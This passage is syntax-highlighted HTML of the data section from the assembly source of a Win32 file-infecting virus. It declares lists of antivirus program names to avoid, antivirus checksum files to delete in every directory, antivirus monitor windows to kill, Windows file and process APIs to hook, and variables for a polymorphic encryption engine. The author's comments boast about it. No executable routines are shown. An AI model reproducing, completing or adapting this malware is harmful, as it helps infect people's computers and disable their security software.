</span><span class="sc5">imagebase</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">imagebase_</span><span class="sc0">
</span><span class="sc5">kernel</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">kernel_</span><span class="sc0">

</span><span class="sc5">K32_DLL</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"KERNEL32.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">K32_Size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">K32_DLL</span><span class="sc0">

</span><span class="sc5">szSHELL32</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SHELL32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szUSER32</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"USER32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szADVAPI32</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ADVAPI32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">szOPEN</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"OPEN"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">szMicro$oft</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"http://www.microsoft.com"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Yaaaaaaargh!!!</span><span class="sc0">

</span><span class="sc1">; @@BadProgramz structure</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;       +02h    String Size</span><span class="sc0">
</span><span class="sc1">;       +??h    First letters (string size) of files we don't want to be infected</span><span class="sc0">

</span><span class="sc5">@@BadProgramz</span><span class="sc0">           </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc3">"TB"</span><span class="sc0">        </span><span class="sc1">; ThunderByte?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc3">"F-"</span><span class="sc0">        </span><span class="sc1">; F-Prot?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"NAV"</span><span class="sc0">       </span><span class="sc1">; Norton Antivirus?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"AVP"</span><span class="sc0">       </span><span class="sc1">; AVP?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"WEB"</span><span class="sc0">       </span><span class="sc1">; DrWeb?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"PAV"</span><span class="sc0">       </span><span class="sc1">; Panda?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"DRW"</span><span class="sc0">       </span><span class="sc1">; DrWeb?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc3">"DSAV"</span><span class="sc0">      </span><span class="sc1">; Dr Solomon?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc3">"NOD"</span><span class="sc0">       </span><span class="sc1">; Nod-Ice?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc3">"WINICE"</span><span class="sc0">    </span><span class="sc1">; SoftIce?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc3">"FORMAT"</span><span class="sc0">    </span><span class="sc1">; Format?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc3">"FDISK"</span><span class="sc0">     </span><span class="sc1">; Fdisk?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc3">"SCANDSKW"</span><span class="sc0">  </span><span class="sc1">; ScanDisk?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc3">"DEFRAG"</span><span class="sc0">    </span><span class="sc1">; Defrag?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">

</span><span class="sc5">@@BadPhilez</span><span class="sc0">             </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">            </span><span class="sc1">; Files to delete in all dirz</span><span class="sc0">
</span><span class="sc5">ANTIVIR_DAT</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ANTI-VIR.DAT"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CHKLIST_DAT</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CHKLIST.DAT"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CHKLIST_TAV</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CHKLIST.TAV"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CHKLIST_MS</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CHKLIST.MS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CHKLIST_CPS</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CHKLIST.CPS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">AVP_CRC</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"AVP.CRC"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">IVB_NTZ</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"IVB.NTZ"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SMARTCHK_MS</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SMARTCHK.MS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SMARTCHK_CPS</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SMARTCHK.CPS"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Monitors2Kill</span><span class="sc0">           </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"AVP Monitor"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Amon Antivirus Monitor"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">


</span><span class="sc1">; @@Hookz structure</span><span class="sc0">
</span><span class="sc1">; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;       +00h    API Name</span><span class="sc0">
</span><span class="sc1">;       +??h    Bytes from beginning of virus until beginning of hook handler</span><span class="sc0">

</span><span class="sc5">@@Hookz</span><span class="sc0">                 </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">?szMoveFileA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MoveFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnMoveFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookMoveFileA</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">?szCopyFileA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CopyFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnCopyFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookCopyFileA</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">?szGetFullPathNameA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFullPathNameA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnGetFullPathNameA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookGetFullPathNameA</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">?szDeleteFileA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"DeleteFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnDeleteFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookDeleteFileA</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">?szWinExec</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WinExec"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnWinExec</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookWinExec</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">?szCreateProcessA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateProcessA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnCreateProcessA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookCreateProcessA</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">?szCreateFileA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnCreateFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookCreateFileA</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">?szGetFileAttributesA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnGetFileAttributesA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookGetFileAttributesA</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">?szFindFirstFileA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnFindFirstFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookFindFirstFileA</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">?szFindNextFileA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnFindNextFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookFindNextFileA</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">?szHookGetProcAddress</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">?hnHookGetProcAddress</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HookGetProcAddress</span><span class="sc4">)</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc0">             </span><span class="sc1">; How funny ;)</span><span class="sc0">

</span><span class="sc5">@IsDebuggerPresent</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"IsDebuggerPresent"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; Hrm, i think i should write some compression engine for that API shit :)</span><span class="sc0">

</span><span class="sc5">@@Namez</span><span class="sc0">                 </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">@GetModuleHandleA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetModuleHandleA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@LoadLibraryA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LoadLibraryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@FindClose</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@SetFilePointer</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@SetFileAttributesA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@CloseHandle</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@SetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GetWindowsDirectoryA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetSystemDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@MapViewOfFile</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@SetEndOfFile</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@WriteFile</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WriteFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GetTickCount</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetTickCount"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GetVersion</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetVersion"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GlobalAlloc</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GlobalFree</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalFree"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GetFileSize</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@SetVolumeLabelA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetVolumeLabelA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GetSystemTime</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetSystemTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">@@HookedNamez</span><span class="sc0">           </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">@MoveFileA</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MoveFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@CopyFileA</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CopyFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GetFullPathNameA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFullPathNameA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@DeleteFileA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"DeleteFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@WinExec</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WinExec"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@CreateProcessA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateProcessA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@CreateFileA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GetFileAttributesA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@FindFirstFileA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@FindNextFileA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@GetProcAddress</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">            </span><span class="sc1">; I rule! :)</span><span class="sc0">

</span><span class="sc5">@@USER32_APIs</span><span class="sc0">           </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">@SwapMouseButton</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SwapMouseButton"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@MessageBoxA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MessageBoxA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@FindWindowA</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindWindowA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@PostMessageA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PostMessageA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc0">             </span><span class="sc1">; I like girls...</span><span class="sc0">

</span><span class="sc5">@@ADVAPI32_APIs</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">@RegCreateKeyExA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RegCreateKeyExA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@RegOpenKeyExA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RegOpenKeyExA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@RegDeleteKeyA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RegDeleteKeyA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc0">             </span><span class="sc1">; And music tho :)</span><span class="sc0">

</span><span class="sc5">@@SHELL32_APIs</span><span class="sc0">          </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">@ShellExecuteA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ShellExecuteA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">random_seed</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">rnd_seed1</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">rnd_seed2</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">rnd_seed3</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">; THME Poly Engine data</span><span class="sc0">

</span><span class="sc5">THME_CounterReg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">THME_PointerReg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">THME_DeltaReg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">THME_CoproInit</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">THME_CryptOp</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">THME_Recursion</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">THME_LoopAddress</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">THME_CryptKey</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">THME_Pointer</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">THME_Data2crypt</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">THME_Size2crypt</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">THME_S2C_div4</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">THME_GDO_TmpCll</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">THME_Fix1</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">THME_Key1</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">               </span><span class="sc1">; ADD/SUB/XOR key</span><span class="sc0">

</span><span class="sc1">; Virus data</span><span class="sc0">

</span><span class="sc5">NewSize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SearchHandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FileHandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapAddress</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">AddressTableVA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">NameTableVA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">OrdinalTableVA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TempGA_IT1</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TempGA_IT2</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TempHandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">iobytes</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc2">00000000h</span><span class="sc4">,</span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GlobalAllocHnd</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">GlobalAllocHnd_</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TSHandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">RegHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">Disposition</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">lpFilePart</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">WFD_HndInMem</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
